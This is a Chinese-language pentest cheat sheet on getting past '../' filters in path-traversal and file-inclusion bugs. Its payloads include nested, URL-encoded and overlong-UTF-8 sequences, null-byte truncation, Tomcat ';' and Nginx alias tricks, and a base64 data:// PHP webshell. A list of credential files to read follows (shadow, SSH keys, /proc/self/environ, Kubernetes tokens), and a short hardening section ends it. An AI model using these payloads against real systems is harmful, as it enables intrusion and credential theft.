
# `../`过滤之Bypass技巧
在文件包含（File Inclusion）与路径穿越（Directory Traversal）漏洞中，开发者通常会尝试通过字符串过滤或正则表达式移除 `../`，以限制用户跳出预设的目录边界。绕过这些防御的核心逻辑通常源于：==**过滤逻辑不彻底（单次替换）**、**不同组件间的解码/规范化时序差异（Normalization Discrepancies）**、**操作系统文件系统的底层特性**。==

以下是常见的 `../` 过滤绕过技巧、技术原理及测试载荷分类：

1. ==双写与嵌套绕过（单次/非递归过滤）==

当后端采用非递归的黑名单替换逻辑（如 PHP 中的 `str_replace("../", "", $path)`）时，过滤引擎仅对字符串进行单次遍历扫描。

- **原理**：将 `../` 嵌套在另一个 `../` 中，当内部的 `../` 被移除后，外围截断的字符重新拼接构成有效的穿越序列。
    
- **常见 Payload**：
    
    - `..././` $\rightarrow$ 剔除中间的 `../` 后，剩余 `.` 与 `./` 拼合为 `../`
        
    - `....//` $\rightarrow$ 剔除中间的 `../` 后，外围拼合为 `../`
        
    - `....\/` $\rightarrow$ 混淆斜杠的双写变形
        
    - `.../...//` $\rightarrow$ 针对部分多级替换的变形

例：
```
原始输入:  ....//....//....//etc/passwd
过滤后:    ../../etc/passwd
```



2. ==编码与二次解码绕过==

当 WAF、反向代理（如 Nginx、Apache）与后端应用服务器（如 Tomcat、PHP-FPM、Node.js）对请求的处理链存在多次解码，或者过滤发生在解码之前时，可利用编码绕过校验。

单重 URL 编码

如果过滤器直接检测明文的 `.` 和 `/`，但后端解析引擎在调用系统文件函数时隐式进行了一次 URL 解码：

- `.` $\rightarrow$ `%2e`
    
- `/` $\rightarrow$ `%2f`
    
- `\` $\rightarrow$ `%5c`
    
- **Payload 组合**：
    
    - `%2e%2e/`
        
    - `..%2f`
        
    - `%2e%2e%2f`
        
    - `%2e%2e%5c`


双重 URL 编码（Double Encoding）

当反向代理或 WAF 进行了一次 URL 解码并放行，但后端应用在路由或业务逻辑中再次执行了解码函数：

- `.` $\rightarrow$ `%252e`
    
- `/` $\rightarrow$ `%252f`
    
- `\` $\rightarrow$ `%255c`
    
- **Payload 组合**：
    
    - `%252e%252e%252f`
        
    - `%252e%252e/`
        
    - `%252e%252e%255c`


16位 Unicode / Overlong UTF-8 编码

早期的 IIS 或部分老旧 Java/C 语言编写的解析器存在非标准 UTF-8 字符映射缺陷，允许使用超长编码表示 ASCII 字符：

- `%c0%ae%c0%ae%c0%af`（解码为 `../`）
    
- `%c0%ae%c0%ae/`
    
- `%e0%40%ae%e0%40%ae%e0%40%af`
    
- `%u002e%u002e%u002f`（Unicode 格式）



3. ==操作系统特性与斜杠混淆==

不同操作系统与运行时环境对路径分隔符的处理存在差异：

Windows 环境下的反斜杠（`\`）

Windows 文件系统同时将 `/` 和 `\` 视为有效路径分隔符。如果代码仅过滤了 `../`，未针对 Windows 系统的 `..\` 或混合斜杠进行处理：

- `..\..\windows\win.ini`
    
- `..\/..\/`
    
- `../..\../..\`



空字节截断（Null Byte Injection）

- **适用条件**：PHP < 5.3.4，底层由 C 语言以 `\0` 作为字符串终止符。
    
- **原理**：绕过后端强行拼接文件后缀（如 `include($path . ".php");`）。
    
- **Payload**：`../../../../etc/passwd%00`



路径长度截断

- **适用条件**：部分老旧 PHP 版本（Linux 下超过 4096 字符，Windows 下超过 260 字符）。
    
- **原理**：系统在处理超长路径时自动截断后面的字符，使拼接的后缀失效。
    
- **Payload**：`../../../../etc/passwd/./././.[重复数千次]`


4. ==路径规范化差异（Normalization / Path Traversal）==

现代 Web 框架与中间件在解析路径矩阵参数（Matrix Parameters）或非标准路径格式时的差异：

Spring / Tomcat 矩阵参数（分号 `;` 混淆）

在 Tomcat 与 Spring 体系中，分号用于表示路径参数。如果 WAF 或正则按严格的 `../` 匹配，可以通过注入分号破坏正则特征，而进入底层后被解析为空或忽略：

- `..;/..;/`
    
- `../;foo=bar/../`
    
- `path/..;/..;/WEB-INF/web.xml`




Nginx 别名（Alias）穿越缺陷

当 Nginx 配置中 `location` 块未闭合 `/` 而 `alias` 闭合了 `/`：

例：
```
location /static {
    alias /var/www/app/static/;
}
```
此时通过访问 `/static../` 会被 Nginx 规范化拼接为 `/var/www/app/static/../`，无需在 URL 传参中构造完整的 `../../`。



5. ==无需 `../` 的替代性绕过策略==

当 `.` 或 `/` 被绝对黑名单完全阻断，且无法完成相对路径穿越时，可考虑跳出路径回溯逻辑：

|**绕过技术**|**攻击载荷示例**|**适用场景与原理**|
|---|---|---|
|**绝对路径直接访问**|`/etc/passwd`<br><br>  <br><br>`C:\Windows\win.ini`|后端代码直接 `include($path)` 未拼接前缀目录时，直接使用绝对路径无需 `../`。|
|**PHP 封装协议**|`php://filter/read=convert.base64-encode/resource=index.php`|读取当前工作目录下的源码，不需要跳转到上一级。|
|**数据流 / 输入流**|`php://input`<br><br>  <br><br>`data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+`|直接执行伪协议流中的代码，完全避开文件路径查找。|
|**压缩包协议**|`zip://archive.zip#shell.php`<br><br>  <br><br>`phar://archive.phar/file`|上传包含 Webshell 的合法格式文件，直接通过协议定位内部文件。|

# 敏感文件泄露
在文件包含（Local File Inclusion, LFI）与任意文件读取漏洞中，安全研究员与渗透测试人员的核心目标通常是**从“路径控制”转化为“关键凭据获取、源码审计或系统接管（RCE）”**。

根据不同的操作系统、中间件及运行容器架构，敏感文件泄露的获取技巧与目标路径呈现出高度的结构化特征。以下从**源码逆向**、**Linux/Windows系统敏感面**、**虚拟文件系统（`/proc`）**、**云原生容器上下文**等维度展开系统讲解：


1. ==Web 应用程序源码与配置文件获取==

如果目标环境直接解析脚本（例如 PHP 的 `include "foo.php"` 会直接执行而非打印代码），直接读取会得到空响应或页面渲染结果。此时需要利用流包装器或中间件机制阻断执行、导出源码。


(1) PHP 伪协议编码流提取

通过 `php://filter` 链在解析引擎执行代码之前，将其转换为 Base64 或其他编码输出：

例：
```
?file=php://filter/read=convert.base64-encode/resource=index.php
?file=php://filter/convert.iconv.utf-8.utf-16/resource=config.php
```

- **解密获取源码**：将返回的 Base64 字符串解码即可得到完整的服务端业务代码与硬编码凭据。



(2) 主流框架的配置文件目标

获取源码后优先排查包含数据库密码、加解密 Key（如 `APP_KEY` 用于反序列化利用）的核心配置文件：


|**框架 / 环境**|**典型配置文件绝对/相对路径**|**泄露核心资产**|
|---|---|---|
|**通用 / 现代应用**|`.env`<br><br>  <br><br>`config/config.php`|数据库账号、第三方 API Secret、Redis 密码|
|**Spring Boot**|`WEB-INF/classes/application.yml`<br><br>  <br><br>`BOOT-INF/classes/application.properties`|数据库连接串、服务治理 Token、加解密密钥|
|**ThinkPHP**|`config/database.php`<br><br>  <br><br>`application/database.php`|数据库账密、Cache 配置|
|**Laravel**|`.env`<br><br>  <br><br>`config/app.php`|`APP_KEY`（易导致反序列化 RCE）|
|**Django / Flask**|`settings.py`<br><br>  <br><br>`app.py`|`SECRET_KEY`（伪造 Session 签名）|
|**Node.js**|`package.json`<br><br>  <br><br>`.env`|依赖版本库（挖掘已知 CVE）、环境变量|


2. ==Linux 系统底层敏感信息挖掘==

Linux 的“一切皆文件”特性使得许多系统运行状态、身份认证均能通过文件读取获得。

(1) 用户体系与凭据定位

- `/etc/passwd`：系统用户清单，用于确认 Web 服务运行账户权限、确认存在哪些有效 Bash 用户（如 `uid >= 1000`）。
    
- `/etc/shadow`：存储密码哈希（通常需要 `root` 权限读取，非特权用户通常无权读取）。
    
- `/etc/group`：用户组分配情况。
    
- `/etc/sudoers`：Sudo 授权规则，便于发现提权配置风险。


(2) 用户目录与历史记录探索

通过 `/etc/passwd` 确认用户名后，针对性探测用户 Home 目录：

- `~/.bash_history` / `~/.zsh_history`：管理员的历史命令，通常直接暴露过往配置的数据库密码、临时执行的脚本、敏感目录路径。
    
- `~/.ssh/id_rsa` / `~/.ssh/id_ed25519`：SSH 私钥，若权限配置不当且被读取，可直接实现无密码 SSH 登录。
    
- `~/.ssh/known_hosts`：当前主机曾经连接过的其他内网机器 IP，用于内网横向拓扑绘制。
    
- `~/.ssh/authorized_keys`：公钥信任列表。


(3) 计划任务与自动化配置

- `/etc/crontab`
    
- `/var/spool/cron/crontabs/[username]`
    
- `/etc/cron.d/`
    
- **用途**：审查正在周期性执行的脚本，若脚本可写或引用的路径存在权限松懈，可作为提权或结合日志投毒的跳板。



3. ==Linux `/proc` 伪文件系统的深度利用==

在无法获得高权限读取 `/etc/shadow` 时，`/proc` 目录映射了内核与进程运行时的内存数据，是高价值信息泄露的核心来源。

- **`/proc/self/environ`**：
    
    - **利用价值**：当前 Web 服务的环境变量。
        
    - **实战重点**：在 Docker、Kubernetes 容器化环境中，微服务通常将数据库配置、AWS AK/SK、Token 直接通过 `ENV` 注入。读取该文件可直接获取明文凭据。

- **`/proc/self/cmdline`**：
    
    - **利用价值**：启动当前服务的完整命令行参数，经常暴露主进程加载的配置文件路径或传入的启动密码（如 `java -Dspring.datasource.password=...`）。

- **`/proc/self/cwd`**：
    
    - **利用价值**：指向当前进程工作目录的软链接。当绝对物理路径未知时，可通过读取 `/proc/self/cwd/index.php` 锁定应用根目录。

- **`/proc/self/fd/[0-9]+`**：
    
    - **利用价值**：文件描述符枚举。
        
    - **实战重点**：当某些临时文件被打开后即刻在磁盘上被 `unlink`（删除），但进程句柄未关闭时，可以通过枚举 `fd/` 恢复已删除的文件或读取正在运行的日志流。

- **网络与拓扑探测**：
    
    - `/proc/net/arp`：内网 ARP 缓存表，直接发现内网存活资产 IP 与 MAC。
        
    - `/proc/net/tcp`、`/proc/net/udp`：当前主机的网络连接与监听端口（以十六进制存储，如 `0050` 对应 80 端口），用于内网端口扫描盲探。


4. ==Windows 系统敏感文件定位==

Windows 环境下的权限机制（ACL）与文件系统命名规则具有其独特性：

- **系统与网络凭据**：
    
    - `C:\Windows\System32\drivers\etc\hosts`：内网域名绑定关系。
        
    - `C:\Windows\win.ini` / `C:\Windows\system.ini`：老旧系统配置文件（常用于 PoC 验证任意文件读取漏洞是否存在）。
        
    - `C:\Windows\debug\NetSetup.log`：加域日志，可能记录域控信息与入域历史。

- **无人值守安装留存（明文密码高发区）**：
    
    - `C:\Windows\Panther\Unattend.xml`
        
    - `C:\Windows\Panther\Unattended.xml`
        
    - `C:\Windows\System32\sysprep\unattend.xml`
        
    - 系统部署时遗留的管理员初始化配置，经常包含经 Base64 编码的本地 Administrator 密码。

- **IIS 与 Web 服务器配置**：
    
    - `C:\inetpub\wwwroot\web.config`：IIS 站点核心配置，包含连接字符串与重写规则。
        
    - `C:\Windows\System32\inetsrv\Config\applicationHost.config`：IIS 全局服务器定义，泄露所有站点的物理根路径、绑定的虚拟目录及应用程序池运行账户。

- **注册表与 SAM 备份**（常规运行中 SAM 被系统独占加锁，但存在备份副本）：
    
    - `C:\Windows\Repair\SAM`
        
    - `C:\Windows\System32\config\RegBack\SAM`



5. ==云原生与容器专有凭证==

当 Web 应用程序运行在容器化（Docker / K8s）或公共云上时，可通过针对性的路径快速完成权限跃迁：

- **Kubernetes ServiceAccount Token**：
    
    - 路径：`/var/run/secrets/kubernetes.io/serviceaccount/token`
        
    - 路径：`/var/run/secrets/kubernetes.io/serviceaccount/namespace`
        
    - **价值**：读取到 JWT 格式的 ServiceAccount Token 后，配合 API Server 接口（通常为 `[https://kubernetes.default.svc](https://kubernetes.default.svc)`），可测试是否具有集群命名空间内的读取/创建 Pod 权限（K8s 权限提升）。

- **Docker 容器环境判定**：
    
    - 读取 `/.dockerenv` 或 `/proc/1/cgroup`。若包含 `docker`、`kubepods` 字段，则确认处于隔离容器中，提示转向容器逃逸与云环境元数据探测。



6. ==防御与加固策略==

要从根本上杜绝敏感文件泄露，仅依靠黑名单过滤文件名称是无效的，应在不同层面构建纵深防御：

1. **白名单映射机制**：业务中避免直接接收用户传入的路径作为文件操作参数，改用索引映射（如 `switch($page) { case 'a': include 'a.php'; break; }`）。

2. **底层隔离（open_basedir / chroot）**：
    
    - 在 PHP 配置中设置 `open_basedir = /var/www/html/:/tmp/`，严格限制文件系统访问边界，使应用无法跳出指定目录。
        
    - 采用独立系统用户运行 Web 进程，严禁使用 `root` 或 `Administrator` 启动应用。

3. **安全配置规范化**：
    
    - 移除 Web 根目录外的符号链接访问权限。
        
    - 部署前清理系统安装留存（如 `Unattend.xml`）、历史命令（`.bash_history`）。
        
    - 生产环境禁用能够绕过执行限制的高危协议（如调整 `allow_url_include = Off`）。
